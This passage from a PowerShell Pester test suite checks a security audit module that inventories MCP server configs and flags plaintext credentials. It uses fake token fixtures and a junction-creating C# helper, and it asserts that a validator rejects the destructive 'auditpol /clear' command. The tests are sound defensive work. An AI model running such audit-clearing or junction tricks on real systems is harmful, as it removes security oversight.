            Test-CEUndoCommandAllowed "auditpol.exe /restore /file:'relative.csv'" | Should -BeNullOrEmpty
            Test-CEUndoCommandAllowed 'auditpol.exe /clear /y' | Should -Not -BeNullOrEmpty
        }
    }
}

Describe 'MCP inventory (11-McpInventory)' {
    Context 'JSONC parsing' {
        It 'parses strict JSON' {
            InModuleScope CEAudit { (ConvertFrom-CEJsonc -Text '{"a":1}').a | Should -Be 1 }
        }
        It 'tolerates line and block comments and trailing commas' {
            InModuleScope CEAudit {
                $t = "{`n // c`n `"servers`": { `"x`": { `"command`": `"npx`", }, /* b */ },`n}"
                (ConvertFrom-CEJsonc -Text $t).servers.x.command | Should -Be 'npx'
            }
        }
        It 'does not strip // or commas inside strings' {
            InModuleScope CEAudit {
                $r = ConvertFrom-CEJsonc -Text '{"url":"https://x/y","note":"a, b"}'
                $r.url | Should -Be 'https://x/y'
                $r.note | Should -Be 'a, b'
            }
        }
        It 'throws on genuinely malformed input' {
            InModuleScope CEAudit { { ConvertFrom-CEJsonc -Text '{ not json' } | Should -Throw }
        }
    }
    Context 'credential classification' {
        It 'classifies by prefix and marks plaintext' {
            InModuleScope CEAudit {
                $p = Get-CECredentialPatterns
                $c = Get-CECredentialClass -Key 'GITHUB_PERSONAL_ACCESS_TOKEN' -Value 'ghp_abcdEFGH1234567890' -Patterns $p
                $c.provider | Should -Be 'github'; $c.type | Should -Be 'pat-classic'; $c.storage | Should -Be 'plaintext-config'
            }
        }
        It 'treats a reference as env-var-reference, not plaintext' {
            InModuleScope CEAudit {
                $p = Get-CECredentialPatterns
                (Get-CECredentialClass -Key 'API_KEY' -Value '${env:MY_KEY}' -Patterns $p).storage | Should -Be 'env-var-reference'
            }
        }
        It 'returns null for a non-credential key/value' {
            InModuleScope CEAudit {
                $p = Get-CECredentialPatterns
                Get-CECredentialClass -Key 'command' -Value 'npx' -Patterns $p | Should -BeNullOrEmpty
            }
        }
        It 'returns unknown provider rather than guessing' {
            InModuleScope CEAudit {
                $p = Get-CECredentialPatterns
                (Get-CECredentialClass -Key 'SOME_TOKEN' -Value 'literalsecretvalue' -Patterns $p).provider | Should -Be 'unknown'
            }
        }
    }
    Context 'inventory end to end' {
        BeforeAll {
            $script:mcpTmp = Join-Path ([IO.Path]::GetTempPath()) ('eb-mcp-' + [guid]::NewGuid().ToString('N'))
            New-Item -ItemType Directory -Path $script:mcpTmp -Force | Out-Null
            $script:secret = 'ghp_SUPERsecretVALUE0123456789abcd'
            $fixture = '{ "mcpServers": { "github": { "command": "npx", "args": ["-y","@modelcontextprotocol/server-github"], "env": { "GITHUB_PERSONAL_ACCESS_TOKEN": "' + $script:secret + '" } }, "safe": { "command": "npx", "args": ["-y","@x/server"], "env": { "OPENAI_API_KEY": "${env:MY_KEY}" } } } }'
            $fixture | Set-Content -LiteralPath (Join-Path $script:mcpTmp '.claude.json') -Encoding ascii
        }
        AfterAll { Remove-Item -LiteralPath $script:mcpTmp -Recurse -Force -ErrorAction SilentlyContinue }
        It 'inventories servers and classifies credentials in the user session' {
            $inv = InModuleScope CEAudit -Parameters @{ Tmp = $script:mcpTmp } {
                param($Tmp)
                Mock Get-CEUserProfilePath { $Tmp }
                Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T'; AuditTime = (Get-Date); IsElevated = $false; IsSystem = $false; ConsoleUserSid = $null })
            }
            $inv.mcpConfigsFound | Should -Be 1
            $inv.mcpConfigsParsed | Should -Be 1
            @($inv.mcpServers).Count | Should -Be 2
            $inv.credentialsFound | Should -Be 2
            $inv.credentialsPlaintext | Should -Be 1
        }
        It 'never lets a credential value reach the output' {
            $json = InModuleScope CEAudit -Parameters @{ Tmp = $script:mcpTmp } {
                param($Tmp)
                Mock Get-CEUserProfilePath { $Tmp }
                (Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T2'; AuditTime = (Get-Date); IsElevated = $false; IsSystem = $false; ConsoleUserSid = $null })) | ConvertTo-Json -Depth 12
            }
            $json | Should -Not -Match ([regex]::Escape($script:secret))
        }
        It 'machine (SYSTEM) context records presence only, never reads contents' {
            $res = InModuleScope CEAudit -Parameters @{ Tmp = $script:mcpTmp } {
                param($Tmp)
                Mock Get-CEUserProfilePath { $Tmp }
                $i = Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T3'; AuditTime = (Get-Date); IsElevated = $true; IsSystem = $true; ConsoleUserSid = 'S-1-5-21-1-1-1-1001' })
                [pscustomobject]@{ Found = $i.mcpConfigsFound; Parsed = $i.mcpConfigsParsed; Creds = $i.credentialsFound; Json = ($i | ConvertTo-Json -Depth 12) }
            }
            $res.Found | Should -Be 1
            $res.Parsed | Should -Be 0
            $res.Creds | Should -Be 0
            $res.Json | Should -Not -Match ([regex]::Escape($script:secret))
        }
        It 'machine (SYSTEM) context does not look up config files through a link in the profile, and says it found the link' {
            # alice's .cursor is a junction to bob's: as SYSTEM, bob's file must not be looked up under alice.
            # The link is reported as found, not read, rather than dropped.
            $alice = Join-Path $TestDrive 'mcp-alice'
            $bob = Join-Path $TestDrive 'mcp-bob\.cursor'
            New-Item -ItemType Directory -Force -Path $alice, $bob, (Join-Path $alice 'AppData\Roaming\Claude') | Out-Null
            Set-Content -LiteralPath (Join-Path $bob 'mcp.json') -Value '{ "mcpServers": {} }' -Encoding ASCII
            Set-Content -LiteralPath (Join-Path $alice 'AppData\Roaming\Claude\claude_desktop_config.json') -Value '{ "mcpServers": {} }' -Encoding ASCII
            $link = Join-Path $alice '.cursor'
            New-Item -ItemType Junction -Path $link -Target $bob | Out-Null
            Use-TestTags   # the junction's target is walked from the drive root: TestDrive and the folders above it count as plain
            try {
                $inv = InModuleScope CEAudit -Parameters @{ P = $alice } {
                    param($P)
                    Mock Get-CEUserProfilePath { $P }
                    Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T4'; AuditTime = (Get-Date); IsElevated = $true; IsSystem = $true; ConsoleUserSid = 'S-1-5-21-1-1-1-1001' })
                }
                $inv.mcpConfigsFound | Should -Be 2 -Because 'the file reached through plain folders, and the one seen through a checked junction'
                @($inv.mcpServers | ForEach-Object { $_.configPath }) | Should -Be @('AppData\Roaming\Claude\claude_desktop_config.json') -Because 'only the file reached through plain folders is recorded as present'
                @($inv.mcpConfigsUnreadable | ForEach-Object { "$($_.path)|$($_.kind)|$($_.reason)|$($_.needsUserSession)" }) |
                    Should -Be @('.cursor\mcp.json|file-content|a junction or symbolic link on the way is not followed when reading file contents above the user''s rights|True')
            }
            finally { if ([IO.Directory]::Exists($link)) { [IO.Directory]::Delete($link) } }
        }
        It 'machine (SYSTEM) context does not look up a config file that is itself a link, and says it found it' {
            # Every folder on the way is plain, but the file is a link. A test account can't create a file
            # symbolic link, so the classifier says so for .claude.json.
            $inv = InModuleScope CEAudit -Parameters @{ Tmp = $script:mcpTmp } {
                param($Tmp)
                Mock Get-CEUserProfilePath { $Tmp }
                Mock Get-CEReparseKind { if ($Item.Name -eq '.claude.json') { 'symlink' } else { 'none' } }
                [pscustomobject]@{
                    System   = Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T5'; AuditTime = (Get-Date); IsElevated = $true; IsSystem = $true; ConsoleUserSid = 'S-1-5-21-1-1-1-1001' })
                    Elevated = Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T6'; AuditTime = (Get-Date); IsElevated = $true; IsSystem = $false; ConsoleUserSid = $null })
                    User     = Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T7'; AuditTime = (Get-Date); IsElevated = $false; IsSystem = $false; ConsoleUserSid = $null })
                }
            }
            foreach ($k in 'System', 'Elevated') {
                # An elevated audit has more rights than the user too.
                $inv.$k.mcpConfigsFound | Should -Be 1 -Because "$k reports the link as found"
                $inv.$k.mcpConfigsParsed | Should -Be 0
                @($inv.$k.mcpServers).Count | Should -Be 0 -Because "$k does not record a link's permissions or contents"
                @($inv.$k.mcpConfigsUnreadable | ForEach-Object { "$($_.path)|$($_.kind)|$($_.reason)" }) |
                    Should -Be @('.claude.json|file-content|it is a junction or symbolic link, which is not followed when reading file contents above the user''s rights')
            }
            $inv.User.mcpConfigsFound | Should -Be 1 -Because "the user's own session follows their links"
            $inv.User.mcpConfigsParsed | Should -Be 1
            @($inv.User.mcpConfigsUnreadable).Count | Should -Be 0
        }
        It 'machine (SYSTEM) context does not record a config file that is a real symbolic link' {
            $dir = Join-Path $TestDrive 'mcp-filelink'
            New-Item -ItemType Directory -Force -Path $dir | Out-Null
            $link = Join-Path $dir '.claude.json'
            try { New-Item -ItemType SymbolicLink -Path $link -Target (Join-Path $script:mcpTmp '.claude.json') -ErrorAction Stop | Out-Null }
            catch { Set-ItResult -Skipped -Because "this account can't create symbolic links: $($_.Exception.Message)"; return }
            try {
                $inv = InModuleScope CEAudit -Parameters @{ P = $dir } {
                    param($P)
                    Mock Get-CEUserProfilePath { $P }
                    Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T8'; AuditTime = (Get-Date); IsElevated = $true; IsSystem = $true; ConsoleUserSid = 'S-1-5-21-1-1-1-1001' })
                }
                @($inv.mcpServers).Count | Should -Be 0
                @($inv.mcpConfigsUnreadable | ForEach-Object { $_.reason }) | Should -Be @('it is a junction or symbolic link, which is not followed when reading file contents above the user''s rights')
            }
            finally { Remove-Item -LiteralPath $link -Force }
        }
        It 'an elevated audit reports a config behind a link as found, not read, and SC-13 says so; the user session reads it' {
            # alice keeps .cursor in a dotfiles folder through a junction, and its mcp.json holds a plaintext PAT.
            $alice = Join-Path $TestDrive 'mcp-elev-alice'
            $dots = Join-Path $TestDrive 'mcp-elev-dotfiles\.cursor'
            New-Item -ItemType Directory -Force -Path $alice, $dots | Out-Null
            $cfg = '{ "mcpServers": { "github": { "command": "npx", "args": ["-y","@modelcontextprotocol/server-github"], "env": { "GITHUB_PERSONAL_ACCESS_TOKEN": "' + $script:secret + '" } } } }'
            Set-Content -LiteralPath (Join-Path $dots 'mcp.json') -Value $cfg -Encoding ASCII
            $link = Join-Path $alice '.cursor'
            New-Item -ItemType Junction -Path $link -Target $dots | Out-Null
            Use-TestTags   # the junction's target is walked from the drive root: TestDrive and the folders above it count as plain
            try {
                $inv = InModuleScope CEAudit -Parameters @{ P = $alice } {
                    param($P)
                    Mock Get-CEUserProfilePath { $P }
                    [pscustomobject]@{
                        Elevated = Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T9'; AuditTime = (Get-Date); IsElevated = $true; IsSystem = $false; ConsoleUserSid = $null })
                        User     = Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T10'; AuditTime = (Get-Date); IsElevated = $false; IsSystem = $false; ConsoleUserSid = $null })
                    }
                }
                $why = 'a junction or symbolic link on the way is not followed when reading file contents above the user''s rights'
                $inv.Elevated.mcpConfigsFound | Should -Be 1 -Because 'a config behind a link is found, not read, never dropped'
                $inv.Elevated.mcpConfigsParsed | Should -Be 0
                @($inv.Elevated.mcpServers).Count | Should -Be 0
                @($inv.Elevated.mcpConfigsUnreadable | ForEach-Object { "$($_.path)|$($_.toolId)|$($_.reason)|$($_.needsUserSession)|$($_.location)" }) | Should -Be @(".cursor\mcp.json|cursor|$why|True|%USERPROFILE%\.cursor\mcp.json")
                ($inv.Elevated | ConvertTo-Json -Depth 12) | Should -Not -Match ([regex]::Escape($script:secret))
                $inv.User.mcpConfigsFound | Should -Be 1
                $inv.User.mcpConfigsParsed | Should -Be 1
                $inv.User.credentialsPlaintext | Should -Be 1

                # SC-13 on the elevated audit: Manual with the config as evidence, not NotApplicable.
                Set-TestDevice -Kind Insecure -ContextOverride @{ IsElevated = $true; IsSystem = $false }
                $global:CETestMcp = $inv.Elevated
                Mock -ModuleName CEAudit Get-CEMcpInventory { $global:CETestMcp }
                $f = @(Invoke-CEAuditCore -Id 'SC-13')
                $f.Count | Should -Be 1
                $f[0].Status | Should -Be 'Manual'
                $f[0].Actual | Should -Be "No MCP servers were read, but 1 MCP config file(s) were found, not read: .cursor\mcp.json (cursor): $why"
                @($f[0].Evidence) | Should -Be @(".cursor\mcp.json (cursor): $why")
                $f[0].Recommendation | Should -Match 'without elevation while signed in as that user'
                $f[0].Recommendation | Should -Match 'per-user probe runs this check'
                # The user's own session reads it and finds the plaintext PAT.
                $global:CETestMcp = $inv.User
                $f = @(Invoke-CEAuditCore -Id 'SC-13')
                $f[0].Status | Should -BeIn @('Fail', 'Warn')
                $f[0].Actual | Should -Match 'github in \.cursor\\mcp\.json: github'
            }
            finally {
                if ([IO.Directory]::Exists($link)) { [IO.Directory]::Delete($link) }
                Remove-Variable -Name CETestMcp -Scope Global -ErrorAction SilentlyContinue
            }
        }
        It 'an elevated audit does not download a config file stored online only' {
            $dir = Join-Path $TestDrive 'mcp-offline'
            New-Item -ItemType Directory -Force -Path $dir | Out-Null
            Copy-Item -LiteralPath (Join-Path $script:mcpTmp '.claude.json') -Destination (Join-Path $dir '.claude.json')
            # FILE_ATTRIBUTE_OFFLINE, one of the attributes of a file a sync app keeps online only; any account may set it.
            [IO.File]::SetAttributes((Join-Path $dir '.claude.json'), [IO.FileAttributes]::Offline)
            $inv = InModuleScope CEAudit -Parameters @{ P = $dir } {
                param($P)
                Mock Get-CEUserProfilePath { $P }
                Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T11'; AuditTime = (Get-Date); IsElevated = $true; IsSystem = $false; ConsoleUserSid = $null })
            }
            $inv.mcpConfigsFound | Should -Be 1
            $inv.mcpConfigsParsed | Should -Be 0
            @($inv.mcpConfigsUnreadable | ForEach-Object { "$($_.reason)|$($_.needsUserSession)" }) | Should -Be @('it is stored online only, and an elevated or SYSTEM audit does not download it|True')
        }
    }
}

Describe 'SC-13 AI agent plaintext credentials' {
    function global:New-TestMcp {
        param([object[]]$Servers = @(), [int]$Plaintext = 0, [object[]]$Unreadable = @())
        [ordered]@{
            mcpConfigsFound = @($Servers).Count + @($Unreadable).Count; mcpConfigsParsed = @($Servers).Count
            mcpConfigsUnreadable = @($Unreadable); mcpServers = @($Servers)
            credentialsFound = @(@($Servers) | ForEach-Object { @($_.credentials) }).Count
            credentialsPlaintext = $Plaintext; scanBounds = 'test'
        }
    }
    function global:New-TestMcpServer {
        param([string]$Acl = '', [object[]]$Entries = @(), [string]$Transport = 'stdio', [bool]$AclUnread = $false)
        [ordered]@{ toolId = 'claude-code'; configPath = '.claude.json'; serverName = 'github'; transport = $Transport
            command = 'npx'; argsSummary = '@x'; endpoint = ''; credentialCount = @($Entries).Count
            credentials = @($Entries); configAclIssue = $Acl; aclUnread = $AclUnread }
    }
    function global:New-TestMcpUnread {
        # An entry of mcpConfigsUnreadable as Get-CEMcpInventory writes it.
        param([string]$Path = '.claude.json', [string]$ToolId = 'claude-code', [string]$Kind = 'file-content',
            [string]$Reason = 'it is a junction or symbolic link, which is not followed when reading file contents above the user''s rights', [bool]$NeedsUserSession = $true, [string]$Remedy = '')
        [ordered]@{ path = $Path; toolId = $ToolId; reason = $Reason; needsUserSession = $NeedsUserSession
            location = "%USERPROFILE%\$Path"; kind = $Kind; remedy = $Remedy; topic = 'mcp'; count = 1 }
    }
    BeforeEach { Set-TestDevice 'Insecure' }

    It 'is NotApplicable when no MCP servers are configured' {
        Mock -ModuleName CEAudit Get-CEMcpInventory { New-TestMcp }
        (@(Invoke-CEAuditCore -Id 'SC-13')[0]).Status | Should -Be 'NotApplicable'
    }
    It 'Fails when a plaintext credential sits in a config others can modify' {
        $cred = [ordered]@{ key = 'GITHUB_TOKEN'; provider = 'github'; type = 'pat-classic'; storage = 'plaintext-config' }
        Mock -ModuleName CEAudit Get-CEMcpInventory { New-TestMcp -Plaintext 1 -Servers @(New-TestMcpServer -Acl '.claude.json is writable by S-1-5-32-545' -Entries @($cred)) }
        (@(Invoke-CEAuditCore -Id 'SC-13')[0]).Status | Should -Be 'Fail'
    }
    It 'Warns when a plaintext credential is in a locked-down config' {
        $cred = [ordered]@{ key = 'GITHUB_TOKEN'; provider = 'github'; type = 'pat-classic'; storage = 'plaintext-config' }
        Mock -ModuleName CEAudit Get-CEMcpInventory { New-TestMcp -Plaintext 1 -Servers @(New-TestMcpServer -Acl '' -Entries @($cred)) }
        (@(Invoke-CEAuditCore -Id 'SC-13')[0]).Status | Should -Be 'Warn'
    }
    It 'Passes when every credential is a reference' {
        $cred = [ordered]@{ key = 'GITHUB_TOKEN'; provider = 'github'; type = 'unknown'; storage = 'env-var-reference' }
        Mock -ModuleName CEAudit Get-CEMcpInventory { New-TestMcp -Plaintext 0 -Servers @(New-TestMcpServer -Entries @($cred)) }
        (@(Invoke-CEAuditCore -Id 'SC-13')[0]).Status | Should -Be 'Pass'
    }
    It 'is Manual in a machine context where contents were not read' {
        Mock -ModuleName CEAudit Get-CEMcpInventory { New-TestMcp -Servers @(New-TestMcpServer -Transport 'not-read') }
        (@(Invoke-CEAuditCore -Id 'SC-13')[0]).Status | Should -Be 'Manual'
    }
    It 'is Manual, not NotApplicable, when configs were found but not read, and names them' {
        Mock -ModuleName CEAudit Get-CEMcpInventory {
            New-TestMcp -Unreadable @(New-TestMcpUnread -Reason 'it is stored online only, and an elevated or SYSTEM audit does not download it')
        }
        $f = @(Invoke-CEAuditCore -Id 'SC-13')
        $f[0].Status | Should -Be 'Manual'
        @($f[0].Evidence) | Should -Be @('.claude.json (claude-code): it is stored online only, and an elevated or SYSTEM audit does not download it')
        $f[0].Actual | Should -Match 'found, not read'
        $f[0].Recommendation | Should -Match 'Invoke-CEUserProbe'
        # A config that could not be parsed is advised on differently.
        Mock -ModuleName CEAudit Get-CEMcpInventory {
            New-TestMcp -Unreadable @(New-TestMcpUnread -Reason 'it could not be parsed by the audit' -NeedsUserSession $false -Remedy 'Check that each config file named is valid JSON (the audit also accepts comments and trailing commas), then run the audit again.')
        }
        $f = @(Invoke-CEAuditCore -Id 'SC-13')
        $f[0].Status | Should -Be 'Manual'
        $f[0].Recommendation | Should -Not -Match 'elevat'
        $f[0].Recommendation | Should -Match 'valid JSON'
        # An older record with no kind or topic still counts.
        Mock -ModuleName CEAudit Get-CEMcpInventory {
            New-TestMcp -Unreadable @([ordered]@{ path = '.claude.json'; toolId = 'claude-code'; reason = 'not read'; needsUserSession = $true })
        }
        (@(Invoke-CEAuditCore -Id 'SC-13'))[0].Status | Should -Be 'Manual'
    }
    It 'does not Pass while a config was found but not read' {
        $cred = [ordered]@{ key = 'GITHUB_TOKEN'; provider = 'github'; type = 'unknown'; storage = 'env-var-reference' }
        Mock -ModuleName CEAudit Get-CEMcpInventory {
            New-TestMcp -Servers @(New-TestMcpServer -Entries @($cred)) -Unreadable @(New-TestMcpUnread -Path '.cursor\mcp.json' -ToolId 'cursor')
        }
        $f = @(Invoke-CEAuditCore -Id 'SC-13')
        $f[0].Status | Should -Be 'Manual'
        $f[0].Actual | Should -Match 'found, not read: \.cursor\\mcp\.json \(cursor\)'
    }
}

Describe 'Get-CEAiPosture MCP folding' {
    It 'folds plaintext credentials into deviations and exposes the count and servers' {
        Set-TestDevice 'Insecure'
        Mock -ModuleName CEAudit Get-CEMcpInventory {
            [ordered]@{ mcpConfigsFound = 1; mcpConfigsParsed = 1; mcpConfigsUnreadable = @()
                mcpServers = @([ordered]@{ toolId = 'claude-code'; configPath = '.claude.json'; serverName = 'github'; transport = 'stdio'; command = 'npx'; argsSummary = '@x'; endpoint = ''; credentialCount = 1; credentials = @([ordered]@{ key = 'GITHUB_TOKEN'; provider = 'github'; type = 'pat-classic'; storage = 'plaintext-config' }); configAclIssue = '' })
                credentialsFound = 1; credentialsPlaintext = 1; scanBounds = 'test' }
        }
        $ai = InModuleScope CEAudit { Get-CEAiPosture -Context (Get-CEDeviceContext) }
        $ai.credentialsPlaintext | Should -Be 1
        $ai.deviations | Should -BeGreaterOrEqual 1
        $ai.contained | Should -BeFalse
        @($ai.mcpServers).Count | Should -Be 1
    }
}

Describe 'Profile read layer (15-ProfileReads)' {
    BeforeAll {
        function global:Use-TestReparseTags {
            # Gives the paths in Tags (path -> tag) that tag as the module reads it; every other path gets its real
            # tag (Pester 6 mocks have no fallback). Only items that are reparse points, or folders set Offline, are
            # asked, so the paths must be real junctions: this account can't create symbolic links.
            param([hashtable]$Tags)
            Use-TestTags $Tags
        }
        $global:CETagSymlink = [Convert]::ToInt64('A000000C', 16)
        $global:CETestJunctionBad = 'a junction on the way leads through a symbolic link or to a location the audit does not recognise'
        function global:Set-TestDeny {
            # Denies this account the rights named (icacls letters, such as RD or RA) on Path, or with -Remove takes
            # that back. -Link applies to a junction itself, not to what it points to.
            param([string]$Path, [string]$Rights, [switch]$Link, [switch]$Remove)
            $sid = '*' + [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
            $a = @($Path)
            if ($Remove) { $a += '/remove:d', $sid } else { $a += '/deny', "${sid}:($Rights)" }
            if ($Link) { $a += '/L' }
            $out = & icacls.exe @a 2>&1
            if ($LASTEXITCODE -ne 0) { throw "icacls $($a -join ' ') failed: $out" }
        }
        if (-not ('CETest.MountPoint' -as [type])) {
            # Writes a junction (mount point) with any target, as FSCTL_SET_REPARSE_POINT takes it, which New-Item
            # refuses for some; lists through one and returns the Win32 error; and defines a drive letter for this
            # session. Loopback targets only.
            Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
namespace CETest {
    public static class MountPoint {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern IntPtr CreateFileW(string name, uint access, uint share, IntPtr security, uint disposition, uint flags, IntPtr template);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeviceIoControl(IntPtr handle, uint code, byte[] inBuf, int inSize, IntPtr outBuf, int outSize, out int returned, IntPtr overlapped);
        [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)] static extern IntPtr FindFirstFileW(string name, IntPtr data);
        [DllImport("kernel32.dll")] static extern bool FindClose(IntPtr handle);
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)] static extern bool DefineDosDeviceW(uint flags, string name, string target);
        public static int Set(string dir, string target) {
            // GENERIC_WRITE; OPEN_EXISTING; OPEN_REPARSE_POINT | BACKUP_SEMANTICS.
            IntPtr h = CreateFileW(dir, 0x40000000, 0, IntPtr.Zero, 3, 0x00200000 | 0x02000000, IntPtr.Zero);
            if (h == IntPtr.Zero || h == new IntPtr(-1)) { return Marshal.GetLastWin32Error(); }
            try {
                byte[] sub = System.Text.Encoding.Unicode.GetBytes(target);
                int dataLength = 8 + sub.Length + 2 + 2;
                byte[] buf = new byte[8 + dataLength];
                BitConverter.GetBytes(0xA0000003u).CopyTo(buf, 0);
                BitConverter.GetBytes((ushort)dataLength).CopyTo(buf, 4);
                BitConverter.GetBytes((ushort)0).CopyTo(buf, 8);
                BitConverter.GetBytes((ushort)sub.Length).CopyTo(buf, 10);
                BitConverter.GetBytes((ushort)(sub.Length + 2)).CopyTo(buf, 12);
                BitConverter.GetBytes((ushort)0).CopyTo(buf, 14);
                sub.CopyTo(buf, 16);
                int returned;
                // FSCTL_SET_REPARSE_POINT
                if (!DeviceIoControl(h, 0x000900A4, buf, buf.Length, IntPtr.Zero, 0, out returned, IntPtr.Zero)) { return Marshal.GetLastWin32Error(); }
                return 0;
            }
            finally { CloseHandle(h); }
        }
        public static int ListError(string dir) {
            IntPtr data = Marshal.AllocHGlobal(1024);
            try {
                IntPtr h = FindFirstFileW(dir + "\\*", data);
                if (h == IntPtr.Zero || h == new IntPtr(-1)) { return Marshal.GetLastWin32Error(); }
                FindClose(h);
                return 0;
            }
            finally { Marshal.FreeHGlobal(data); }
        }
        // DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM, and to remove DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE too.
        public static int Define(string letter, string target) { return DefineDosDeviceW(0x1 | 0x8, letter, target) ? 0 : Marshal.GetLastWin32Error(); }
        public static int Undefine(string letter, string target) { return DefineDosDeviceW(0x1 | 0x2 | 0x4 | 0x8, letter, target) ? 0 : Marshal.GetLastWin32Error(); }
    }
}
'@
        }
        $global:CETestLayerLinks = New-Object System.Collections.ArrayList
        function global:New-TestJunction {
            param([string]$Path, [string]$Target)
            New-Item -ItemType Directory -Force -Path $Target | Out-Null
            New-Item -ItemType Directory -Force -Path (Split-Path -Parent $Path) | Out-Null
            New-Item -ItemType Junction -Path $Path -Target $Target | Out-Null
            [void]$global:CETestLayerLinks.Add($Path)
        }
        $global:CETestMcpCtx = { param([bool]$System, [bool]$Elevated, [string]$Name) [pscustomobject]@{ ComputerName = $Name; AuditTime = (Get-Date); IsElevated = $Elevated; IsSystem = $System; ConsoleUserSid = $(if ($System) { 'S-1-5-21-1-1-1-1001' } else { $null }) } }
        $global:CEOrigLayerConfig = InModuleScope CEAudit { @{ Tools = (Get-CEConfig)['ai-tools']; Browsers = (Get-CEConfig)['browser-profiles'] } }
        function global:Set-TestLayerAI {
            # The AI tool state the checks see: Tools, and what was not read.
            param([object[]]$Tools = @(), [object[]]$NotRead = @())
            Set-TestDevice -Kind Secure
            $global:CETestLayerAI = [pscustomobject]@{ Tools = @($Tools); UninspectedProcesses = @(); NotRead = @($NotRead) }
            Mock -ModuleName CEAudit Get-CEAIToolState { $global:CETestLayerAI }
        }
    }
    AfterEach {
        foreach ($l in @($global:CETestLayerLinks)) { if ([IO.Directory]::Exists($l)) { [IO.Directory]::Delete($l) } }
        $global:CETestLayerLinks.Clear()
        InModuleScope CEAudit -Parameters @{ O = $global:CEOrigLayerConfig } { param($O) (Get-CEConfig)['ai-tools'] = $O.Tools; (Get-CEConfig)['browser-profiles'] = $O.Browsers }
    }

    It 'never lets a credential value from an MCP config that fails to parse reach a record, a check or the posture' {
        # Windows PowerShell 5.1 quotes the token it could not parse in the error; pwsh 7 names the key.
        $p = Join-Path $TestDrive 'layer-mcp-parse'
        New-Item -ItemType Directory -Force -Path $p | Out-Null
        $secret = 'sk-live-SECRET123'
        Set-Content -LiteralPath (Join-Path $p '.claude.json') -Value "{ `"mcpServers`": { `"x`": { `"env`": { `"K`": $secret } } } }" -Encoding ASCII
        $inv = InModuleScope CEAudit -Parameters @{ P = $p; C = $global:CETestMcpCtx } {
            param($P, $C)
            Mock Get-CEUserProfilePath { $P }
            Get-CEMcpInventory -Context (& $C $false $false 'L1')
        }
        $inv.mcpConfigsFound | Should -Be 1
        $inv.mcpConfigsParsed | Should -Be 0
        @($inv.mcpConfigsUnreadable | ForEach-Object { "$($_.path)|$($_.kind)|$($_.reason)|$($_.needsUserSession)" }) | Should -Be @('.claude.json|file-content|it could not be parsed by the audit|False')
        ($inv | ConvertTo-Json -Depth 12) | Should -Not -Match 'SECRET123|mcpServers\.x|Invalid JSON'
        ($inv | ConvertTo-Json -Depth 12) | Should -Not -Match ([regex]::Escape($p)) -Because 'no absolute profile path is recorded'
        Set-TestDevice -Kind Secure
        $global:CETestMcp = $inv
        Mock -ModuleName CEAudit Get-CEMcpInventory { $global:CETestMcp }
        $f = @(Invoke-CEAuditCore -Id 'SC-13')
        $f[0].Status | Should -Be 'Manual'
        ($f | ConvertTo-Json -Depth 8) | Should -Not -Match 'SECRET123'
        $ai = InModuleScope CEAudit { Get-CEAiPosture -Context (Get-CEDeviceContext) }
        ($ai | ConvertTo-Json -Depth 12) | Should -Not -Match 'SECRET123'
        @($ai.notRead | Where-Object { $_.topic -eq 'mcp' } | ForEach-Object { "$($_.location)|$($_.reason)" }) | Should -Be @('%USERPROFILE%\.claude.json|it could not be parsed by the audit')
        # Permissions that can't be read are not "other users can modify it", and their error text is not kept.
        InModuleScope CEAudit {
            Mock Get-CEPathAclProblem { "$Path permissions could not be read: Attempted to perform an unauthorized operation." }
            $acl = Get-CEMcpConfigAcl -Full 'C:\Users\alice\.claude.json' -Rel '.claude.json'
            $acl.Unread | Should -BeTrue
            $acl.Issue | Should -Be ''
            Mock Get-CEPathAclProblem { "$Path is writable by S-1-5-32-545" }
            (Get-CEMcpConfigAcl -Full 'C:\Users\alice\.claude.json' -Rel '.claude.json').Issue | Should -Be '.claude.json is writable by S-1-5-32-545' -Because 'the path is shown relative to the profile'
            Read-CEBoundedText -Path 'C:\no\such\folder\x.json' -MaxBytes 10 | Should -BeNullOrEmpty
        }
        # A file that is there and can't be opened: the reason names only the error's type, never its text or the path.
        $locked = Join-Path $p 'locked.json'
        Set-Content -LiteralPath $locked -Value "{ `"k`": `"$secret`" }" -Encoding ASCII
        $me = [Security.Principal.WindowsIdentity]::GetCurrent().User
        $acl = Get-Acl -LiteralPath $locked
        $deny = New-Object Security.AccessControl.FileSystemAccessRule($me, 'ReadData', 'Deny')
        $acl.AddAccessRule($deny)
        Set-Acl -LiteralPath $locked -AclObject $acl
        try {
            $why = InModuleScope CEAudit -Parameters @{ L = $locked } {
                param($L)
                $why = [ref]''
                Read-CEBoundedText -Path $L -MaxBytes 1KB -SkipReason $why | Should -BeNullOrEmpty
                $why.Value
            }
            $why | Should -Be 'it could not be read (UnauthorizedAccessException)' -Because 'a reason carries at most the type of an error, never its text'
        }
        finally {
            $acl = Get-Acl -LiteralPath $locked
            [void]$acl.RemoveAccessRule($deny)
            Set-Acl -LiteralPath $locked -AclObject $acl
        }
    }

    It 'records a Manual in SC-09 and a note in UA-07 when a junction on the way leads through a symbolic link, and keeps UA-07 when a browser could not be checked' {
        $root = Join-Path $TestDrive 'layer-ai'
        $p = Join-Path $root 'profile'
        New-Item -ItemType Directory -Force -Path $p | Out-Null
        # .vscode is a junction whose target passes through 'link', a folder the module sees as a symbolic link.
        New-TestJunction -Path (Join-Path $root 'T\link') -Target (Join-Path $root 'elsewhere')
